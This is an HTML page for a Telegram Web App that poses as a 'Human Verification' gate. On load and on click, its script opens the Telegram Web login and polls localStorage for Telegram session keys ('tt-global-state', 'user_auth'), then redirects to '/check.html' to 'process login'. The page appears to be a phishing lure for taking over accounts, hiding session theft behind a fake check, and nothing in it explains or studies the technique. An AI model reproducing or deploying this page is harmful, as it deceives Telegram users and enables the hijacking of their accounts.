<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Human Verification</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #1c2526;
      color: white;
      text-align: center;
      padding: 20px;
      margin: 0;
      height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
    }
    h2 {
      font-size: 24px;
      margin-bottom: 10px;
    }
    p {
      font-size: 16px;
      margin-bottom: 20px;
    }
    button {
      background-color: #2e7d32;
      color: white;
      border: none;
      padding: 10px 20px;
      font-size: 16px;
      border-radius: 5px;
      cursor: pointer;
    }
    button:hover {
      background-color: #3d9c43;
    }
  </style>
</head>
<body>
  <h2>Human Verification</h2>
  <p>Verify below to be granted entry</p>
  <button onclick="verify()">Click here</button>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
<script>
  function verify() {
    Telegram.WebApp.ready();
    // Attempt to open login within WebApp context
    Telegram.WebApp.openTelegramLink('https://web.telegram.org/a/'); // Try to keep within Telegram

    // Poll for login state
    const checkLoginInterval = setInterval(() => {
      const globalState = localStorage.getItem("tt-global-state");
      if (globalState && localStorage.getItem("user_auth")) {
        clearInterval(checkLoginInterval);
        // Redirect to check.html to process login
        window.location.href = "/check.html";
      } else {
        console.log("Waiting for login... globalState:", globalState);
      }
    }, 1000); // Check every second
  }

  // Auto-trigger verify on load
  window.onload = verify;
</script>
</body>
</html>
